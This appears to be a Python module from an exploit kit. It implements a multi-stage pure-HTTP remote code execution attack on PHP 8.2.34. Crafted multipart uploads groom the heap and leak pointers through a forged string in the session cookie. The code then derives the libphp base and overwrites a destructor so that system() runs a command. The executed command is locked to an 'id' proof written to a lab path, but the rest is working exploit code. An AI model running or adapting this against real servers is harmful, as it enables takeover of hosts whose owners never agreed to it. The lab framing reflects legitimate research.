#!/usr/bin/env python3
"""Declarative pure-HTTP/OOM recipe interpreter for an exact PHP build.

This module implements the request construction measured in the local PHP
8.2.34 lab.  It is intentionally reached only after ``profile.py`` has
accepted a verified exact-build profile and a fresh target manifest.  It has
no target, command, symbol, or heap-geometry command-line inputs.

The A1/B1/A2/B2 algorithm follows the 9bie pure-HTTP work cited in
THIRD_PARTY_NOTICES.md.  Its source files are not included here.  The byte
geometry is stored in a local profile and checked against locally reproduced
request hashes by this generic renderer.
"""

from __future__ import annotations

import re
import struct
import time
import urllib.parse
from collections import Counter
from pathlib import Path
from typing import Any, Mapping

from profile import Profile, ProfileError, parse_hex
from zend_payload import (
    build_destructor_payload,
    build_reference_tiles,
    place_zend_string_header,
)


POINTER_MIN = 0x700000000000
POINTER_MAX = 0x800000000000


def _is_user_pointer(value: int) -> bool:
    return POINTER_MIN <= value < POINTER_MAX


def _proof(path: Path) -> str:
    try:
        value = path.read_text(encoding="utf-8", errors="replace").strip()
    except OSError:
        return ""
    return value if re.search(r"(?:^|\s)uid=\d+", value) else ""


class MultipartDocument:
    """Small renderer used by every pure-HTTP stage."""

    def __init__(self, boundary_length: int):
        self.boundary = b"C" * boundary_length
        self._bytes = bytearray()

    @staticmethod
    def _token(value: bytes, label: str) -> bytes:
        if any(mark in value for mark in (b'"', b"\r", b"\n")):
            raise ProfileError(f"multipart {label} contains a forbidden byte")
        return value

    def field(
        self,
        name: bytes,
        value: bytes = b"",
        *,
        filename: bytes | None = None,
        content_type: bytes | None = None,
        empty_file: bool = False,
    ) -> None:
        name = self._token(name, "name")
        self._bytes += b"--" + self.boundary
        self._bytes += b'\r\nContent-Disposition: form-data; name="' + name + b'"'
        if filename is not None:
            self._bytes += b'; filename="' + self._token(filename, "filename") + b'"'
        self._bytes += b"\r\n"
        if content_type is not None:
            self._bytes += b"Content-Type: " + self._token(content_type, "content type") + b"\r\n"
        self._bytes += b"\r\n"
        if not empty_file:
            self._bytes += value + b"\r\n"

    def finish(self) -> tuple[bytes, bytes]:
        self._bytes += b"--" + self.boundary + b"--\r\n"
        return bytes(self._bytes), self.boundary


def _series_name(prefix: str, index: int, digits: int, length: int, pad: bytes) -> bytes:
    seed = f"{prefix}{index:0{digits}d}".encode("ascii")
    return seed.ljust(length, pad)[:length]


class PureHttpOomExploit:
    """Build and execute the four profiled A1/B1/A2/B2 HTTP requests."""

    def __init__(self, target: Any, profile: Profile, command: bytes):
        if profile.strategy != "pure-http-oom-v1":
            raise ProfileError("pure HTTP engine received the wrong strategy")
        if not re.fullmatch(rb"id>/out/[A-Za-z0-9][A-Za-z0-9._-]{0,47}", command):
            raise ProfileError("pure HTTP engine accepts only the fixed uid proof command")
        self.target = target
        self.profile = profile
        self.command = command
        self.recipe = profile.raw["request_recipe"]
        self.abi = profile.raw["abi"]
        self.runtime = profile.raw["runtime"]
        self.page_size = parse_hex(self.abi["page_size"], "abi.page_size")
        self.chunk_size = parse_hex(self.abi["zend_mm_chunk_size"], "abi.zend_mm_chunk_size")
        self.zif_offset = profile.hx("symbols", "zif_system", "offset")
        self.dtor_offset = profile.hx("symbols", "zval_ptr_dtor", "offset")

    @staticmethod
    def _nested_name(index: int, depth: int, key_pad: int = 0) -> bytes:
        stem = f"files[R{index:05d}{'K' * key_pad}]".encode("ascii")
        return stem + b"[a]" * (depth - 2)

    def build_a1(self) -> tuple[bytes, bytes, str]:
        spec = self.recipe["a1"]
        document = MultipartDocument(int(spec["boundary_len"]))
        document.field(self.runtime["session_name"].encode("ascii"), b"\x00")

        ctype_lengths = tuple(int(value) for value in spec["ctype_lengths"])
        for index in range(int(spec["nested_parts"])):
            name = self._nested_name(index, int(spec["depth"]), int(spec["key_pad"]))
            ctype = (
                b"C" * ctype_lengths[index]
                if index < len(ctype_lengths)
                else b"application/octet-stream"
            )
            document.field(
                name,
                filename=b"A" if index < len(ctype_lengths) else b"",
                content_type=ctype,
                empty_file=True,
            )

        small = spec["small_fillers"]
        for index in range(int(small["count"])):
            name = _series_name("f", index, 4, int(small["name_len"]), b"x")
            document.field(name, b"v" * int(small["value_len"]))

        tune = spec["tune"]
        for index in range(int(tune["count"])):
            name = _series_name("x", index, 2, int(tune["name_len"]), b"x")
            document.field(name, b"X" * int(tune["value_len"]))

        large = spec["large_fields"]
        for index in range(int(large["count"])):
            name = _series_name("b", index, 4, 5, b"b")
            if index < int(large["long_name_count"]):
                name = name.ljust(int(large["long_name_len"]), b"b")[: int(large["long_name_len"])]
            document.field(name, b"B" * int(large["value_len"]))

        burners = spec["burners"]
        for index in range(int(burners["count"])):
            document.field(
                _series_name("u", index, 2, 3, b"u"),
                b"U" * int(burners["value_len"]),
            )

        document.field(
            self.runtime["upload_progress_name"].encode("ascii"),
            b"k" * int(spec["progress_len"]),
        )
        tail = spec["tail"]
        for index in range(int(tail["count"])):
            name = _series_name("t", index, 2, int(tail["name_len"]), b"t")
            document.field(name, b"T" * int(tail["value_len"]))
        body, boundary = document.finish()

        count = int(self.recipe["query_fields"])
        query = "&".join(f"q{index:07d}=v" for index in range(count))
        return body, boundary, query

    @staticmethod
    def _tag(index: int) -> bytes:
        return b"/" + f"{index % 100:02d}".encode("ascii") + b"BBBBB"

    def _forge_large_value(self, pages: int, index: int) -> bytes:
        spec = self.recipe["b1"]
        length = pages * self.page_size - int(spec["allocator_overhead"])
        value = bytearray(b"A" * length)
        header = parse_hex(spec["target_offset"], "b1.target_offset") - int(spec["value_data_offset"])
        place_zend_string_header(
            value,
            header,
            length=parse_hex(spec["fake_len"], "b1.fake_len"),
        )
        if header + 0x20 > len(value):
            raise ProfileError("b1 tag falls outside its profiled large value")
        value[header + 0x18:header + 0x20] = self._tag(index)
        return bytes(value)

    def build_b1(self) -> tuple[bytes, bytes]:
        spec = self.recipe["b1"]
        document = MultipartDocument(int(spec["boundary_len"]))
        document.field(self.runtime["session_name"].encode("ascii"), b"a")
        document.field(self.runtime["upload_progress_name"].encode("ascii"), b"k0")
        name_len = int(spec["name_len"])
        for index, raw_pages in enumerate(spec["large_pages"]):
            name = _series_name("f", index, 4, name_len, b"f")
            document.field(name, self._forge_large_value(int(raw_pages), index))
        for index in range(int(spec["nested_fillers"])):
            document.field(_series_name("x", index, 5, 6, b"x") + b"[a]" * 12, b"v")
        return document.finish()

    def parse_b1(self, response: bytes) -> tuple[int, list[int], int]:
        session_name = re.escape(self.runtime["session_name"].encode("ascii"))
        match = re.search(rb"Set-Cookie:\s*" + session_name + rb"=([^;\r\n]*)", response, re.I)
        if not match:
            raise ProfileError("pure-http B1 did not return the profiled session cookie")
        raw = urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))
        spec = self.recipe["b1"]
        if len(raw) < parse_hex(spec["fake_len"], "b1.fake_len"):
            raise ProfileError("pure-http B1 cookie is shorter than the forged disclosure")
        if not raw.startswith(self._tag(int(spec["hit_index"]))):
            raise ProfileError("pure-http B1 hit tag does not match the profiled large value")

        pointers: Counter[int] = Counter()
        for offset in range(0, len(raw) - 7, 8):
            value = struct.unpack_from("<Q", raw, offset)[0]
            if _is_user_pointer(value):
                pointers[value] += 1
        if not pointers:
            raise ProfileError("pure-http B1 disclosure contains no user-space pointers")
        destructor, hits = pointers.most_common(1)[0]
        if hits < int(spec["min_dtor_hits"]):
            raise ProfileError("pure-http B1 destructor fingerprint is too weak")
        libphp = destructor - self.dtor_offset
        if libphp <= 0 or libphp % self.page_size:
            raise ProfileError("pure-http B1 did not yield a page-aligned libphp base")

        buckets: Counter[int] = Counter()
        mask = ~(self.chunk_size - 1)
        for pointer, count in pointers.items():
            buckets[pointer & mask] += count
        lib_bucket = destructor & mask
        candidates = [bucket for bucket, _count in buckets.most_common() if bucket != lib_bucket]
        candidates = candidates[: int(spec["main_candidates"])]
        if not candidates:
            raise ProfileError("pure-http B1 did not yield a main-chunk candidate")
        return libphp, candidates, len(raw)

    def build_a2(self) -> tuple[bytes, bytes]:
        spec = self.recipe["a2"]
        document = MultipartDocument(int(spec["boundary_len"]))
        document.field(self.runtime["session_name"].encode("ascii"), b"a" * 32)
        document.field(self.runtime["upload_progress_name"].encode("ascii"), b"k0")
        for index in range(int(spec["fillers"])):
            document.field(f"{index:03d}".encode("ascii"), b"x")
        for index in range(int(spec["nested_parts"])):
            document.field(
                self._nested_name(index, int(spec["depth"])),
                filename=b"",
                content_type=b"application/octet-stream",
                empty_file=True,
            )
        return document.finish()

    def build_b2(self, main_chunk: int, libphp: int) -> tuple[bytes, bytes]:
        spec = self.recipe["b2"]
        value_len = int(spec["value_len"])
        address = main_chunk + parse_hex(spec["fake_array_offset"], "b2.fake_array_offset")
        zif = libphp + self.zif_offset
        spray = build_reference_tiles(
            self.abi,
            address,
            carrier_size=value_len,
            refcount=int(spec["refcount"]),
            first_offset=int(spec["reference_start"]),
            stride=int(spec["reference_step"]),
        )
        fake_array = build_destructor_payload(
            self.abi, address, zif, self.command, carrier_size=value_len
        )
        name_len = int(spec["name_len"])
        document = MultipartDocument(int(spec["boundary_len"]))
        for index in range(int(spec["before_fields"])):
            document.field(_series_name("s", index, 9, name_len, b"x"), spray)
        document.field(b"ht", fake_array)
        document.field(self.runtime["session_name"].encode("ascii"), b"a" * 32)
        document.field(self.runtime["upload_progress_name"].encode("ascii"), b"k0")
        for index in range(int(spec["after_fields"])):
            document.field(_series_name("t", index, 9, name_len, b"x"), spray)
        return document.finish()

    def run(self, proof: Path, retries: int) -> int:
        b1_spec = self.recipe["b1"]
        delta_lo = parse_hex(b1_spec["libphp_delta_min"], "b1.libphp_delta_min")
        delta_hi = parse_hex(b1_spec["libphp_delta_max"], "b1.libphp_delta_max")
        for attempt in range(1, retries + 1):
            self.target.log(f"[*] pure-http A1 ({attempt}/{retries})")
            a1, a1_boundary, query = self.build_a1()
            self.target.post_chunked(
                a1, a1_boundary, query=query, read_cap=1 << 20, timeout=180.0
            )
            del a1
            time.sleep(0.2)

            self.target.log(f"[*] pure-http B1 ({attempt}/{retries})")
            b1, b1_boundary = self.build_b1()
            response = self.target.post_chunked(
                b1, b1_boundary, read_cap=4 << 20, timeout=600.0
            )
            del b1
            try:
                libphp, candidates, disclosed = self.parse_b1(response)
            except ProfileError as exc:
                self.target.log(f"[-] B1 rejected: {exc}")
                continue
            self.target.log(f"[+] B1 disclosed {disclosed} bytes; libphp=0x{libphp:x}")

            for main_chunk in candidates:
                delta = libphp - main_chunk
                if not delta_lo <= delta <= delta_hi:
                    continue
                self.target.log(f"[*] pure-http A2/B2 main=0x{main_chunk:x}")
                a2, a2_boundary = self.build_a2()
                self.target.post(a2, a2_boundary, read_cap=1 << 20, timeout=180.0)
                del a2
                time.sleep(0.2)
                b2, b2_boundary = self.build_b2(main_chunk, libphp)
                self.target.post(b2, b2_boundary, read_cap=1 << 20, timeout=120.0)
                del b2
                time.sleep(0.6)
                result = _proof(proof)
                if result:
                    print(f"PROOF: {result}")
                    return 0
        raise ProfileError("pure-http-oom-v1 produced no uid proof in its profiled attempts")


def run_pure_http_oom(
    target: Any,
    profile: Profile,
    command: bytes,
    proof: Path,
    retries: int,
) -> int:
    return PureHttpOomExploit(target, profile, command).run(proof, retries)
